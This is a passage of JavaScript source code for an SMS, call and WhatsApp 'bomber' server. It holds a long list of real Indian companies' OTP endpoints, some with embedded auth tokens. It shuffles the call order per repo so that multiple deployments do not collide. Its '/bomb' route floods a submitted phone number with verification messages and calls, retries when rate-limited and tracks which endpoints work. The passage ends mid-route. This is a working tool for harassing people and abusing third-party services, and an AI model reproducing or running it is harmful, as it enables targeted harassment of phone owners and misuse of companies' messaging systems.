      headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://pocketcredit.in", "Referer": "https://pocketcredit.in/auth" },
      data: (phone) => JSON.stringify({ mobile: phone }), rateLimit: true },
    { name: "Pagarbook", method: "POST", url: "https://api.pagarbook.com/api/v5/auth/otp/request",
      headers: { "accept": "application/json, text/plain, */*", "appversioncode": "5268", "clientbuildnumber": "5268", "clientplatform": "WEB", "content-type": "application/json", "origin": "https://web.pagarbook.com", "referer": "https://web.pagarbook.com/", "userrole": "EMPLOYER" },
      data: (phone) => JSON.stringify({ phone: phone, language: 1 }), rateLimit: true },
    { name: "Wellness_Forever", method: "POST", url: "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      data: (phone) => ({ "_raw": `method=firstRegisterApi&data={"customerMobile":"${phone}","generateOtp":"true"}` }) },
    { name: "TataCapital_Retail", method: "POST", url: "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner",
      headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.tatacapital.com", "referer": "https://www.tatacapital.com/" },
      data: (phone) => JSON.stringify({ header: { authToken: "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==", identifier: "nli" }, body: { mobileNumber: phone } }) },
    { name: "Animall", method: "POST", url: "https://animall.in/zap/auth/login",
      headers: { "Content-Type": "application/json" },
      data: (phone) => JSON.stringify({ phone: phone, signupPlatform: "NATIVE_ANDROID" }) },
    { name: "Swipe", method: "POST", url: "https://app.getswipe.in/api/user/mobile_login",
      headers: { "Content-Type": "application/json" },
      data: (phone) => JSON.stringify({ mobile: phone, resend: true }) },
    { name: "Wrogn", method: "POST", url: "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp",
      headers: { "accept": "*/*", "action": "sendOTP", "content-type": "application/json", "origin": "https://wrogn.com", "referer": "https://wrogn.com/", "shop_name": "wrogn-website.myshopify.com" },
      data: (phone) => JSON.stringify({ username: "+91" + phone, type: "mobile", domain: "wrogn.com", recaptcha_token: "" }) },
    { name: "Entri", method: "POST", url: "https://entri.app/api/v3/users/check-phone/",
      headers: { "Content-Type": "application/json" },
      data: (phone) => JSON.stringify({ phone: phone }) },
    { name: "UdyogPlus", method: "POST", url: "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP",
      headers: { "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://udyogplus.adityabirlacapital.com", "Referer": "https://udyogplus.adityabirlacapital.com/signup-cobranded", "X-Requested-With": "XMLHttpRequest" },
      data: { "_raw": "MobileNumber={phone}&functionality=signup" } },
    { name: "RelianceRetail_New", method: "POST", url: "https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp",
      headers: { "accept": "application/json", "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXR1cm5fdWlfdXJsIjoid3d3Lmppb21hcnQuY29tL2N1c3RvbWVyL2FjY291bnQvbG9naW4_bXNpdGU9eWVzIiwiY2xpZW50X2lkIjoiZmRiNjQ2ZWEtZTcwOC00NzI1LWE5NTMtMjI4ZmExY2I4MzU1IiwiaWF0IjoxNzczMzE3Nzg4LCJzYWx0IjowfQ.DLFEXcyozGInRiLn3U2dTGQEwTog6UYc3WP62ujmJGY", "content-type": "application/json", "origin": "https://account.relianceretail.com", "referer": "https://account.relianceretail.com/" },
      data: (phone) => JSON.stringify({ mobile: phone }) },
    { name: "Aakash_Anthe", method: "POST", url: "https://antheapi.aakash.ac.in/api/generate-lead-otp",
      headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.aakash.ac.in", "referer": "https://www.aakash.ac.in/", "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763" },
      data: (phone) => JSON.stringify({ mobile_psid: phone, mobile_number: "", activity_type: "aakash-myadmission", webengageData: { profile: "student", whatsapp_opt_in: true, method: "mobile" } }) },
    { name: "Tyreplex", method: "POST", url: "https://www.tyreplex.com/includes/ajax/gfend.php",
      headers: { "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.tyreplex.com", "Referer": "https://www.tyreplex.com/login", "X-Requested-With": "XMLHttpRequest" },
      data: { "_raw": "perform_action=sendOTP&mobile_no={phone}&action_type=order_login" } },
    { name: "ServeTel", method: "POST", url: "https://api.servetel.in/v1/auth/otp",
      headers: { "Content-Type": "application/x-www-form-urlencoded; charset=utf-8" },
      data: { "_raw": "mobile_number={phone}" } },
    { name: "IIFL", method: "POST", url: "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1",
      headers: { "accept": "application/json, text/javascript, */*; q=0.01", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.iifl.com", "referer": "https://www.iifl.com/personal-loans", "x-requested-with": "XMLHttpRequest" },
      data: { "_raw": "apply_for=18&full_name=Adnvs+Signh&mobile_number={phone}&terms_and_condition=1" } },
    { name: "CityMall_Web", method: "POST", url: "https://citymall.live/web-api/auth/send-otp",
      headers: { "accept": "application/json, text/plain, */*", "content-type": "application/json", "host": "citymall.live", "origin": "https://citymall.live", "referer": "https://citymall.live/", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36" },
      data: (phone) => JSON.stringify({ phone_number: phone }) },
    { name: "Gokwik_New", method: "POST", url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
      headers: { "accept": "application/json, text/plain, */*", "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc3MzMxODk3NiwiZXhwIjoxNzczMzE5MDM2fQ.JzLZU2gjI0EBtokMC08rF20PCf4nL-NxxmoxXzHb6Dc", "content-type": "application/json", "gk-merchant-id": "19g6ilhzwnelw", "gk-platform": "shopify", "gk-request-id": "44fa696d-db10-4fb4-8b31-84baaeb0c3aa", "gk-signature": "394259", "gk-timestamp": "59110632", "gk-udf-1": "4479", "gk-version": "20260305172819153", "origin": "https://pdp.gokwik.co", "referer": "https://pdp.gokwik.co/", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36" },
      data: (phone) => JSON.stringify({ phone: phone, country: "IN" }) },
    { name: "RojgarKaro_SendOTP", method: "POST", url: "https://rojgarkaro.in/api/auth/sendOTP",
      headers: { "Content-Type": "application/json", "Origin": "https://rojgarkaro.in", "Referer": "https://rojgarkaro.in/" },
      data: (phone) => JSON.stringify({ mobile_no: phone, isSessionActive: false }), rateLimit: true },
    { name: "FundsBull", method: "POST", url: "https://backend.fundsbull.com/api/user/send-otp",
      headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://fundsbull.com", "Referer": "https://fundsbull.com/" },
      data: (phone) => JSON.stringify({ phone_number: phone }), rateLimit: true },
    { name: "Penpencil_GetOTP", method: "POST", url: "https://api.penpencil.co/v1/users/get-otp",
      headers: { "accept": "application/json, text/plain, */*", "content-type": "application/json", "client": "hasura", "client_type": "WEB", "origin": "https://store.pw.live", "referer": "https://store.pw.live/", "randomid": "d6c503fb-9ed9-ee6d-ddde-319d99b08793", "suborgid": "SUB-PWST002", "version": "0.0.1" },
      data: (phone) => JSON.stringify({ username: phone, countryCode: "+91", organizationId: "5eb393ee95fab7468a79d189" }), rateLimit: true },
    { name: "NoBroker_OTP", method: "POST", url: "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true",
      headers: { "accept": "*/*", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.nobroker.in", "referer": "https://www.nobroker.in/" },
      data: { "_raw": "phone=%2B91{phone}" }, rateLimit: true },
    { name: "Moneyview", method: "POST", url: "https://pwa.gw.moneyview.in/uis/pwa/generate-otp",
      headers: { "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarymR7z7x8fbdmHNVcw", "Origin": "https://moneyview.in", "Referer": "https://moneyview.in/" },
      data: (phone) => `------WebKitFormBoundarymR7z7x8fbdmHNVcw\r\nContent-Disposition: form-data; name="key"\r\n\r\nMOBILE\r\n------WebKitFormBoundarymR7z7x8fbdmHNVcw\r\nContent-Disposition: form-data; name="mobile"\r\n\r\n${phone}\r\n------WebKitFormBoundarymR7z7x8fbdmHNVcw\r\nContent-Disposition: form-data; name="source"\r\n\r\npwa\r\n------WebKitFormBoundarymR7z7x8fbdmHNVcw--\r\n`,
      rateLimit: true },
    { name: "SalaryBolt", method: "POST", url: "https://backend.salarybolt.com/api/user/send-otp",
      headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "origin": "https://salarybolt.com", "referer": "https://salarybolt.com/" },
      data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone }), rateLimit: true },
    { name: "Penpencil_Resend", method: "POST", url: "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
      headers: { "accept": "*/*", "content-type": "application/json", "randomid": "42517571-2047-4b35-a6b9-c9b2687857f9", "origin": "https://www.pw.live", "referer": "https://www.pw.live/" },
      data: (phone) => JSON.stringify({ mobile: phone, organizationId: "5eb393ee95fab7468a79d189" }), rateLimit: true },
    { name: "Cosmofeed", method: "POST", url: "https://prod.api.cosmofeed.com/api/user/authenticate",
      headers: { "accept": "application/json, text/plain, */*", "content-type": "application/json", "cosmofeed-request-id": "fe247a51-c977-4882-a9b8-fe303692ddc3", "origin": "https://superprofile.bio", "referer": "https://superprofile.bio/" },
      data: (phone) => JSON.stringify({ phoneNumber: phone, countryCode: "+91", data: { email: "abcd2@gmail.com" }, authScreen: "signup-screen", userIsConvertingToCreator: false }), rateLimit: true },
    { name: "Sephora", method: "POST", url: "https://sephora.in/api/service/application/user/authentication/v1.0/login/otp?platform=6523fa5f41f4eb4c10a1d869",
      headers: { "Content-Type": "application/json", "authorization": "Bearer NjUyM2ZhNWY0MWY0ZWI0YzEwYTFkODY5Ong5Z0hpYWVpZA==", "Origin": "https://sephora.in", "Referer": "https://sephora.in/" },
      data: (phone) => JSON.stringify({ mobile: phone, country_code: "91" }), rateLimit: true },
    { name: "BlinkrLoan", method: "POST", url: "https://backend.blinkrloan.com/api/user/v3/send-otp",
      headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "withCredentials": "true", "Origin": "https://www.blinkrloan.com", "Referer": "https://www.blinkrloan.com/" },
      data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone, lat: "26.123456", lng: "77.123456", url: "https://www.blinkrloan.com/apply/pan-mobile" }), rateLimit: true },
    { name: "FundoBaba", method: "POST", url: "https://backend.fundobaba.com/api/user/send-otp",
      headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://fundobaba.com", "Referer": "https://fundobaba.com/" },
      data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone }), rateLimit: true },
    { name: "DuniyaFinance", method: "POST", url: "https://backend.duniyafinance.in/api/user/send-otp",
      headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://duniyafinance.com", "Referer": "https://duniyafinance.com/" },
      data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone }), rateLimit: true },
    { name: "RupeeRedee", method: "POST", url: "https://webservice-in-prod.rupeeredee.com/gate/api/v1/OTP",
      headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "applicationid": "", "deviceid": "abc-uuid", "platform": "Web", "origin": "https://www.rupeeredee.com", "referer": "https://www.rupeeredee.com/" },
      data: (phone) => JSON.stringify({ number: "+91" + phone, type: "Mobile" }), rateLimit: true },
    { name: "NaukriLoans", method: "POST", url: "https://backend.naukriloans.com/api/user/send-otp",
      headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://naukriloans.com", "Referer": "https://naukriloans.com/" },
      data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone }), rateLimit: true },
    { name: "Apollo247", method: "POST", url: "https://apigateway.apollo247.in/auth-service/generateOtp",
      headers: { "accept": "application/json, text/plain, */*", "authorization": "Bearer 3d1833da7020e0602165529446587434", "content-type": "application/json", "origin": "https://www.apollopharmacy.in", "referer": "https://www.apollopharmacy.in/", "x-app-device-id": "Desktop", "x-app-os": "web" },
      data: (phone) => JSON.stringify({ loginType: "PATIENT", mobileNumber: "+91" + phone }), rateLimit: true },
    { name: "1MG_New", method: "POST", url: "https://www.1mg.com/pwa-dweb-api/auth/create_token",
      headers: { "accept": "application/vnd.healthkartplus.v4+json", "content-type": "application/json", "hkp-platform": "Healthkartplus-0.0.1-desktopweb", "locale": "en", "origin": "https://www.1mg.com", "x-1mglabs-platform": "dWeb", "x-access-key": "1mg_client_access_key", "x-city": "New Delhi", "x-platform": "desktop-0.0.1" },
      data: (phone) => JSON.stringify({ phone: phone }), rateLimit: true },
    { name: "Penpencil_Register", method: "POST", url: "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0",
      headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.pw.live", "randomid": "e66d7f5b-7963-408e-9892-839015a9c83f" },
      data: (phone) => JSON.stringify({ mobile: phone, countryCode: "+91", subOrgId: "SUB-PWLI000" }), rateLimit: true },
    { name: "SabkaLoan", method: "POST", url: "https://api.sabkaloan.com/api/send-otp",
      headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://sabkaloan.com", "Referer": "https://sabkaloan.com/" },
      data: (phone) => JSON.stringify({ mobile: phone }) },
    { name: "RealEstateIndia_Call", method: "POST", url: "https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php",
      headers: { "x-requested-with": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded" },
      data: { "_raw": "action_id=call_to_otp&mob_num={phone}&member_id=1547045" } },
    { name: "MagicBricks_Call", method: "GET", url: "https://api.magicbricks.com/bricks/verifyOnCall.html?mobile={phone}", headers: {} },
    { name: "Career360_Call", method: "POST", url: "https://www.careers360.com/ajax/no-cache/user/otp-send",
      headers: { "X-Requested-With": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded" },
      data: { "_raw": "mobile_number={phone}&method=call&uid=12692588" } },
    { name: "MamaEarth_WA", method: "POST", url: "https://auth.mamaearth.in/v1/auth/initiate-signup",
      headers: { "Content-Type": "application/json" },
      data: (phone) => JSON.stringify({ mobile: phone }) },
    { name: "Havells_WA", method: "POST", url: "https://havells.com/otplogin/account/otploginpost/",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      data: { "_raw": "form_key=GvFYqgGVWCkuLoNT&mobile_number={phone}&is_whatsapp_promo=on" } },
    { name: "HeroFinCorp_WA", method: "POST", url: "https://loans.apps.herofincorp.com/api/generateOtp",
      headers: { "Content-Type": "application/json" },
      data: (phone) => JSON.stringify({ phone: phone, terms: true, whatsapp: true }) },
    { name: "RoyalChallengers", method: "POST", url: "https://shop.royalchallengers.com/api/customer/login",
      headers: { "Content-Type": "application/json", "user-agent": "okhttp/3.9.1" },
      data: (phone) => JSON.stringify({ utype: "Online", mobile: phone, email: "" }) },
    { name: "Cashify", method: "GET", url: "https://www.cashify.in/api/cu01/v1/app-link?mn={phone}",
      headers: { "user-agent": "okhttp/3.9.1" } },
    { name: "Tradgo", method: "POST", url: "https://tradgo.in/appapi4/Forgot_password_new/getOtp",
      headers: { "Content-Type": "application/json", "User-Agent": "okhttp/3.9.1" },
      data: (phone) => JSON.stringify({ mobile: phone }) },
    { name: "Gapoon", method: "POST", url: "https://www.gapoon.com/userSignup",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      data: { "_raw": "mobile={phone}&email=noreply@gmail.com&name=LexLuthor" } },
    { name: "AllenSolly", method: "POST", url: "https://www.allensolly.com/capillarylogin/validateMobileOrEMail",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      data: { "_raw": "mobileoremail={phone}&name=markluther" } },
    { name: "Jockey_WhatsApp", method: "GET", url: "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
      headers: { "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36", "accept": "*/*" } },
    { name: "Hungama_Verified", method: "POST", url: "https://communication.api.hungama.com/v1/communication/otp",
      headers: { "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36", "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "identifier": "home", "mlang": "en", "country_code": "IN", "origin": "https://www.hungama.com", "referer": "https://www.hungama.com/" },
      data: (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un", messageId: "1", emailId: "", subject: "Register", priority: "1", device: "web", variant: "v1", templateCode: 1 }) },
    { name: "NoBroker_Verified", method: "POST", url: "https://www.nobroker.in/api/v3/account/otp/send",
      headers: { "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36", "Content-Type": "application/x-www-form-urlencoded", "origin": "https://www.nobroker.in", "referer": "https://www.nobroker.in/" },
      data: { "_raw": "phone={phone}&countryCode=IN" } },
    { name: "TataCapital_Verified", method: "POST", url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
      headers: { "Content-Type": "application/json" },
      data: (phone) => JSON.stringify({ phone: phone, applSource: "", isOtpViaCallAtLogin: "true" }) },
    { name: "Swiggy_Verified", method: "POST", url: "https://profile.swiggy.com/api/v3/app/request_call_verification",
      headers: { "user-agent": "Swiggy-Android", "content-type": "application/json; charset=utf-8" },
      data: (phone) => JSON.stringify({ mobile: phone }) },
    { name: "Servetel_Verified", method: "POST", url: "https://api.servetel.in/v1/auth/otp",
      headers: { "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13)" },
      data: { "_raw": "mobile_number={phone}" } },
    { name: "KPNFresh_Verified", method: "POST", url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
      headers: { "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", "content-type": "application/json", "origin": "https://www.kpnfresh.com", "referer": "https://www.kpnfresh.com/" },
      data: (phone) => JSON.stringify({ phone_number: { number: phone, country_code: "+91" } }) }
];

// ============================================================
// ===== DEDUPLICATE =====
// ============================================================
const seenUrls = new Set();
const seenNames = new Set();
const uniqueApis = [];
for (const api of APIS) {
    const urlKey = typeof api.url === 'function' ? `dynamic_${api.name}` : api.url;
    if (!seenUrls.has(urlKey) && !seenNames.has(api.name)) {
        seenUrls.add(urlKey);
        seenNames.add(api.name);
        uniqueApis.push(api);
    }
}
const NORMAL_APIS = uniqueApis.filter(a => !a.rateLimit);
const RATE_LIMIT_APIS = uniqueApis.filter(a => a.rateLimit);

// ============================================================
// ⭐ REPO-SPECIFIC ROTATION + SHUFFLE LOGIC
// Har repo me APIs ka ORDER bilkul alag hoga
// Same time pe same API kisi do repo me collide nahi karegi
// ============================================================

// Seeded random generator (repo-specific, deterministic)
function seededRandom(seed) {
    let s = seed;
    return function() {
        s = (s * 9301 + 49297) % 233280;
        return s / 233280;
    };
}

// Repo-specific rotation + shuffle
function buildRepoSequence(apis, repoId) {
    // Step 1: Rotate by repoId * 17 (co-prime-ish with array length)
    const offset = (repoId * 17) % apis.length;
    const rotated = [...apis.slice(offset), ...apis.slice(0, offset)];

    // Step 2: Seeded shuffle with repoId
    const rng = seededRandom(repoId * 7919 + 12345);
    const shuffled = [...rotated];
    for (let i = shuffled.length - 1; i > 0; i--) {
        const j = Math.floor(rng() * (i + 1));
        [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
    }
    return shuffled;
}

// Build this repo's unique sequence
const REPO_SEQUENCE = buildRepoSequence(uniqueApis, REPO_ID);
const REPO_RATE_LIMIT_SEQUENCE = buildRepoSequence(RATE_LIMIT_APIS, REPO_ID + 100);

// Verify: first 5 API names (for debugging)
console.log(`✅ ${REPO_NAME} | Loaded ${uniqueApis.length} APIs | Normal: ${NORMAL_APIS.length} | RL: ${RATE_LIMIT_APIS.length}`);
console.log(`🔀 ${REPO_NAME} | First 5 APIs: ${REPO_SEQUENCE.slice(0, 5).map(a => a.name).join(', ')}`);

// ============================================================
// ===== STATS =====
// ============================================================
const stats = {};
const recentLogs = [];
const MAX_LOGS = 500;
uniqueApis.forEach(api => {
    stats[api.name] = { name: api.name, total: 0, working_2xx: 0, rate_limited_429: 0, rejected_4xx: 0, failed_5xx: 0, network_error: 0, lastStatus: null, lastStatusCode: null, lastTime: null, lastError: null, avgResponseTime: 0, isRateLimited: api.rateLimit || false };
});

function logEvent(msg, type = 'info') {
    const emoji = { info: 'ℹ️', success: '✅', error: '❌', warn: '⚠️', rl: '🚫' }[type] || 'ℹ️';
    console.log(`${emoji} [${new Date().toISOString().slice(11, 19)}] ${msg}`);
    recentLogs.push({ time: new Date().toISOString(), type, msg });
    if (recentLogs.length > MAX_LOGS) recentLogs.shift();
}

function recordResult(apiName, category, statusCode, responseTime, error = null) {
    const s = stats[apiName];
    if (!s) return;
    s.total++;
    if (category === 'success') { s.working_2xx++; s.lastStatus = 'WORKING'; }
    else if (category === 'ratelimit') { s.rate_limited_429++; s.lastStatus = 'RATE_LIMITED'; }
    else if (category === 'rejected') { s.rejected_4xx++; s.lastStatus = 'REJECTED'; }
    else if (category === 'fail5xx') { s.failed_5xx++; s.lastStatus = 'FAILED_5XX'; }
    else { s.network_error++; s.lastStatus = 'NETWORK_ERROR'; }
    s.lastStatusCode = statusCode;
    s.lastTime = new Date().toISOString();
    s.lastError = error;
    s.avgResponseTime = s.avgResponseTime === 0 ? responseTime : Math.round((s.avgResponseTime * (s.total - 1) + responseTime) / s.total);
}

// ============================================================
// ===== API CALL =====
// ============================================================
function makeFallbackData(phone, apiName) {
    const lower = apiName.toLowerCase();
    if (lower.includes('voice') || lower.includes('call')) return JSON.stringify({ mobile: phone });
    if (lower.includes('whatsapp')) return JSON.stringify({ mobile: phone, channel: "whatsapp" });
    return JSON.stringify({ mobile: phone });
}

async function makeApiCall(api, phone, retryCount = 0) {
    const startTime = Date.now();
    try {
        let url = api.url;
        if (typeof url === 'function') url = url(phone);
        else if (url.includes('{phone}')) url = url.replace(/{phone}/g, phone);

        const headers = { ...api.headers };
        delete headers['content-length']; delete headers['Content-Length'];
        delete headers['host']; delete headers['Host'];

        let data = null, isRaw = false;
        if (api.data) {
            if (typeof api.data === 'function') data = api.data(phone);
            else if (api.data._raw) {
                let rawData = api.data._raw;
                if (typeof rawData === 'string') rawData = rawData.replace(/{phone}/g, phone);
                data = rawData; isRaw = true;
            } else {
                data = JSON.parse(JSON.stringify(api.data));
                const replacePhone = (obj) => {
                    if (typeof obj === 'string') return obj.replace(/{phone}/g, phone);
                    if (Array.isArray(obj)) return obj.map(replacePhone);
                    if (typeof obj === 'object' && obj !== null) {
                        const n = {};
                        for (let k in obj) n[k] = replacePhone(obj[k]);
                        return n;
                    }
                    return obj;
                };
                data = replacePhone(data);
            }
        } else data = makeFallbackData(phone, api.name);

        const method = api.method.toLowerCase();
        const config = { method, url, headers, timeout: 5000, validateStatus: () => true };
        if (method === 'post' || method === 'put') {
            if (isRaw || typeof data === 'string') {
                config.data = data;
                if (typeof data === 'string' && data.includes('=') && !data.startsWith('{') && !data.startsWith('[')) {
                    headers['Content-Type'] = 'application/x-www-form-urlencoded';
                }
            } else {
                config.data = JSON.stringify(data);
                if (!headers['Content-Type']) headers['Content-Type'] = 'application/json';
            }
        }

        const response = await axios(config);
        const rt = Date.now() - startTime;
        const st = response.status;
        if (st >= 200 && st < 300) { recordResult(api.name, 'success', st, rt); logEvent(`${api.name} → ${st} (${rt}ms) ✅`, 'success'); return { status: st, success: true, category: 'success', responseTime: rt }; }
        else if (st === 429) { recordResult(api.name, 'ratelimit', st, rt); logEvent(`${api.name} → 429 RL`, 'rl'); if (api.rateLimit && retryCount < 1) { await new Promise(r => setTimeout(r, 3000)); return makeApiCall(api, phone, retryCount + 1); } return { status: st, success: false, category: 'ratelimit', responseTime: rt }; }
        else if (st >= 400 && st < 500) { recordResult(api.name, 'rejected', st, rt); logEvent(`${api.name} → ${st} REJECTED`, 'warn'); return { status: st, success: false, category: 'rejected', responseTime: rt }; }
        else { recordResult(api.name, 'fail5xx', st, rt); logEvent(`${api.name} → ${st} 5XX`, 'error'); return { status: st, success: false, category: 'fail5xx', responseTime: rt }; }
    } catch (err) {
        const rt = Date.now() - startTime;
        const errMsg = err.code || err.message || 'Unknown';
        if (retryCount < 1 && (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNABORTED')) return makeApiCall(api, phone, retryCount + 1);
        recordResult(api.name, 'network', null, rt, errMsg);
        logEvent(`${api.name} → NETWORK_FAIL ${errMsg}`, 'error');
        return { status: null, success: false, category: 'network', responseTime: rt, error: errMsg };
    }
}

// ============================================================
// ===== BOMBING LOGIC (5 sec gap per API) =====
// ============================================================
async function runBombing(phone, effectiveDuration) {
    const startTime = Date.now();
    let success = 0, smsCount = 0, callCount = 0, whatsappCount = 0;
    let rateLimited = 0, rejected = 0, failed = 0;

    // Use REPO_SEQUENCE (repo-specific order)
    const sequence = [...REPO_SEQUENCE];

    console.log(`📋 ${REPO_NAME} | Bombing ${sequence.length} APIs with ${API_DELAY_MS}ms gap`);

    for (let i = 0; i < sequence.length; i++) {
        const api = sequence[i];
        const result = await makeApiCall(api, phone);

        if (result.success) {
            success++;
            const n = (api.name || '').toLowerCase();
            if (n.includes('call') || n.includes('voice')) callCount++;
            else if (n.includes('whatsapp') || n.includes('_wa')) whatsappCount++;
            else smsCount++;
        } else if (result.category === 'ratelimit') rateLimited++;
        else if (result.category === 'rejected') rejected++;
        else failed++;

        // ⭐⭐⭐ 5 SECOND GAP BETWEEN EACH API ⭐⭐⭐
        if (i < sequence.length - 1) {
            await new Promise(r => setTimeout(r, API_DELAY_MS));
        }
    }

    const elapsed = (Date.now() - startTime) / 1000;
    return { success, smsCount, callCount, whatsappCount, rateLimited, rejected, failed, elapsed: elapsed.toFixed(1) };
}

// ============================================================
// ===== ROUTES =====
// ============================================================
app.get('/', (req, res) => {
    res.json({
        status: 'ok',
        repo: REPO_NAME,
        total_apis: uniqueApis.length,
        normal_apis: NORMAL_APIS.length,
        rate_limited_apis: RATE_LIMIT_APIS.length,
        api_delay_ms: API_DELAY_MS,
        max_duration_min: MAX_DURATION_MIN,
        first_5_apis: REPO_SEQUENCE.slice(0, 5).map(a => a.name),
        uptime: Math.round(process.uptime()) + 's'
    });
});

app.get('/health', (req, res) => {
    res.json({ status: 'ok', repo: REPO_NAME, uptime: process.uptime(), apis: uniqueApis.length });
});

app.get('/stats', (req, res) => {
    const arr = Object.values(stats).map(s => {
        let status = 'NEVER TESTED';
        if (s.total > 0) {
            if (s.working_2xx > 0) status = 'WORKING';
            else if (s.rate_limited_429 > 0) status = 'RATE_LIMITED';
            else if (s.rejected_4xx > 0) status = 'REJECTED';
            else status = 'FAILED';
        }
        return { name: s.name, isRateLimited: s.isRateLimited, total: s.total, working_2xx: s.working_2xx, rate_limited_429: s.rate_limited_429, rejected_4xx: s.rejected_4xx, failed_5xx: s.failed_5xx, network_error: s.network_error, successRate: s.total > 0 ? ((s.working_2xx / s.total) * 100).toFixed(1) + '%' : 'N/A', status, lastStatusCode: s.lastStatusCode, lastError: s.lastError, avgResponseTime: s.avgResponseTime + 'ms' };
    });
    res.json({
        repo: REPO_NAME,
        summary: { total: arr.length, working: arr.filter(a => a.status === 'WORKING').length, rate_limited: arr.filter(a => a.status === 'RATE_LIMITED').length, rejected: arr.filter(a => a.status === 'REJECTED').length, failed: arr.filter(a => a.status === 'FAILED').length, untested: arr.filter(a => a.status === 'NEVER TESTED').length },
        apis: arr
    });
});

app.get('/logs', (req, res) => { res.json({ repo: REPO_NAME, count: recentLogs.length, logs: recentLogs.slice(-100).reverse() }); });

app.get('/reset-stats', (req, res) => {
    for (const key in stats) {
        stats[key] = { name: stats[key].name, total: 0, working_2xx: 0, rate_limited_429: 0, rejected_4xx: 0, failed_5xx: 0, network_error: 0, lastStatus: null, lastStatusCode: null, lastTime: null, lastError: null, avgResponseTime: 0, isRateLimited: stats[key].isRateLimited };
    }
    recentLogs.length = 0;
    logEvent('Stats reset', 'warn');
    res.json({ success: true });
});

app.post('/bomb', async (req, res) => {
    const { phone, duration, instance } = req.body;
    if (!phone || phone.length !== 10) return res.status(400).json({ error: 'Invalid phone number.' });
    const requestedDuration = Number(duration) || 1;
    const effectiveDuration = Math.min(requestedDuration, MAX_DURATION_MIN);
    console.log(`\n📱 ${REPO_NAME} | Bombing ${phone} | Duration: ${effectiveDuration}min`);
    try {
        const result = await runBombing(phone, effectiveDuration);
        console.log(`✅ ${REPO_NAME} DONE | ${phone} | OK: ${result.success} | RL: ${result.rateLimited} | Rej: ${result.rejected} | Fail: ${result.failed} | ${result.elapsed}s\n`);
        res.json({
            success: true, repo: REPO_NAME, phone,
